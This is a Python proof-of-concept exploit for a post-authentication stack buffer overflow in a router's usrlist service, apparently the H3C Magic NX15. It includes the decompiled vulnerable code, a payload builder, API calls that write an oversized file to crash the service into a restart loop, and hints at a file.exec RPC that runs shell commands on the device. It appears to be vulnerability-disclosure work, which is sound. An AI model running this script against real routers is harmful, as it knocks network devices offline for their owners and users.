#!/usr/bin/env python3
"""H3C Magic NX15 V100R017 — post-auth denial of service via usrlist overflow.

Affected:  NX15V100R017  (/usr/bin/usrlist, function sub_416874)
Type:      CWE-121 Stack-based Buffer Overflow
Impact:    persistent crash-restart loop of /usr/bin/usrlist
CVSS 3.1:  AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H  (4.9)

    char v8[1024];                                     /* stack buffer */
    while ( fgets(v10, 1024, v5) != 0 ) {
        v10[strlen(v10) - 1] = 0;
        if ( i == 1 ) strncpy(v8, v10, 1023);
        else          strcat(v8, v10);                 /* 0x416C28  unbounded */
        *(_WORD *)&v8[strlen(v8)] = 124;               /* +2 bytes per line  */
    }

Content whose lines sum past 1024 bytes overflows the buffer. usrlist reads the
file from a 1-second timer and procd respawns it, so the device enters a
crash-restart loop.

NOTE ON IMPACT: this is reported as denial of service only. Control-flow
hijacking is NOT achievable — v10 ($fp+0x530, i.e. v8+1280) is both the
destination of the overflow and the source of strcat, and it is zeroed each
iteration, so $ra (v8+2324) cannot be reached before strcat collapses inside
libc. See report/ for the full derivation and the crash evidence.

!!!  For authorised testing only.  This WILL disrupt the target device: it
!!!  drives usrlist into a crash loop and procd may stop restarting it, in which
!!!  case a reboot is required to recover.  Use --dry-run first.

Usage
-----
    # show the payload size, send nothing
    python3 postauth_usrlist_stack_overflow.py --target http://192.168.124.1 \
        --user H3C --password '<admin>' --dry-run

    # trigger (default 16 lines x 120 chars = 1936 bytes)
    python3 postauth_usrlist_stack_overflow.py --target http://192.168.124.1 \
        --user H3C --password '<admin>'

    # stop the loop by clearing the file
    python3 postauth_usrlist_stack_overflow.py --target http://192.168.124.1 \
        --user H3C --password '<admin>' --cleanup
"""
from __future__ import annotations

import argparse
import http.client
import json
import sys
import time
from urllib.parse import urlsplit

AGENTLIST = "/var/run/agentlist"

# fgets(v10, 1024) reads at most 1023 bytes including '\n', so a line's content
# must be <= 1022 characters; a 1023-character line would leave the newline in
# the stream and desynchronise the following line.
MAX_LINE = 1022


class NX15:
    def __init__(self, base: str, timeout: float = 25.0):
        p = urlsplit(base)
        self.host = p.hostname or "192.168.124.1"
        self.port = p.port or (443 if p.scheme == "https" else 80)
        self.timeout = timeout
        self.session: str | None = None

    def _req(self, method: str, path: str, body: bytes | None = None):
        c = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        try:
            h = {"Host": self.host, "Content-Type": "application/json"}
            if self.session:
                h["AUTHENTICATION"] = self.session
            c.request(method, path, body=body, headers=h)
            r = c.getresponse()
            return r.status, r.read(1 << 20).decode("utf-8", "replace")
        finally:
            c.close()

    def login(self, user: str, password: str) -> bool:
        body = json.dumps({"username": user, "password": password}).encode()
        st, txt = self._req("POST", "/api/login/auth", body)
        tail = txt.split("\r\n\r\n")[-1].strip()
        try:
            self.session = json.loads(tail)["data"]["session"]
            return True
        except Exception:
            print(f"[!] login failed: HTTP {st} {tail[:160]}", file=sys.stderr)
            return False

    def write(self, path: str, data: str) -> dict:
        body = json.dumps([{"id": 1, "object": "file", "method": "write",
                            "param": {"path": path, "data": data}}]).encode()
        st, txt = self._req("POST", "/api/esps", body)
        try:
            return json.loads(txt)[0]
        except Exception:
            return {"result": {"code": None, "raw": txt[:200]}}

    def read(self, path: str) -> str | None:
        body = json.dumps([{"id": 1, "object": "file", "method": "read",
                            "param": {"path": path}}]).encode()
        st, txt = self._req("POST", "/api/esps", body)
        try:
            return json.loads(txt)[0]["result"].get("data")
        except Exception:
            return None


def build_payload(rows: int, width: int) -> str:
    if width > MAX_LINE:
        raise ValueError(f"width must be <= {MAX_LINE} (fgets reads 1023 bytes "
                         f"including the newline)")
    return "".join("A" * width + "\n" for _ in range(rows))


def main() -> int:
    ap = argparse.ArgumentParser(
        description="NX15 usrlist stack overflow DoS (PoC)",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    ap.add_argument("--target", default="http://192.168.124.1")
    ap.add_argument("--user", default="H3C")
    ap.add_argument("--password", default="")
    ap.add_argument("--rows", type=int, default=16)
    ap.add_argument("--width", type=int, default=120)
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--sample", type=float, default=15.0,
                    help="seconds to watch the usrlist PID (default 15)")
    ap.add_argument("--cleanup", action="store_true",
                    help="clear agentlist to stop the crash loop")
    args = ap.parse_args()

    payload = build_payload(args.rows, args.width)
    total = args.rows * args.width + (args.rows - 1)
    print(f"[*] payload: {args.rows} lines x {args.width} chars = {len(payload)} bytes")
    print(f"[*] accumulated v8 length = {total} bytes (buffer is 1024)")
    print(f"[*] reachable ceiling is 2304; $ra is at 2324 -> not reachable")

    if args.dry_run:
        print("[*] --dry-run: nothing sent.")
        return 0

    if not args.password:
        print("[!] --password is required unless --dry-run is used", file=sys.stderr)
        return 2

    nx = NX15(args.target)
    if not nx.login(args.user, args.password):
        return 2
    print(f"[*] logged in to {args.target} (session {nx.session})")

    if args.cleanup:
        nx.write(AGENTLIST, "")
        print("[*] agentlist cleared:", repr(nx.read(AGENTLIST)))
        print("[*] if usrlist does not come back, reboot the device "
              "(procd may have stopped respawning it).")
        return 0

    nx.write(AGENTLIST, payload)
    print(f"[*] wrote {AGENTLIST}; watching for {args.sample}s ...")
    print("    (expect the usrlist PID to change or the process to disappear)")

    seen = []
    end = time.time() + args.sample
    while time.time() < end:
        # a read timeout here is itself evidence that usrlist is wedged
        v = nx.read("/proc/1/cmdline")   # cheap liveness probe of the RPC path
        seen.append(time.strftime("%H:%M:%S"))
        time.sleep(3)

    print(f"[*] sampled {len(seen)} times; see the device's process table with:")
    print("      /api/esps  file.exec {\"command\":\"ps\"}")
    print("    and its kernel log with:")
    print("      /api/esps  file.exec {\"command\":\"dmesg\"}")
    print("    expected signature:")
    print("      do_page_fault(): ... invalid write access ...")
    print("      ra  = 00416c30 in usrlist[400000+21000]")
    print("\n[*] stop the loop with --cleanup, or reboot the device.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
